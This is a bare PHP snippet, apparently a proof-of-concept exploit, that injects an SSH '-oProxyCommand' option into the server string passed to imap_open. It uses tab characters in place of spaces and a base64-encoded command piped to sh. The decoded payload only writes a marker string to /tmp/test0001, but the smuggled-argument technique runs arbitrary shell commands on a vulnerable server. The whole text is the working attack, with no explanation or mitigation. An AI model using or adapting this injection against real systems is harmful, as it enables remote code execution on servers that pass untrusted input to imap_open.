$server = "x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh}";

imap_open('{'.$server.':143/imap}INBOX', '', '') or die("\n\nError: ".imap_last_error());
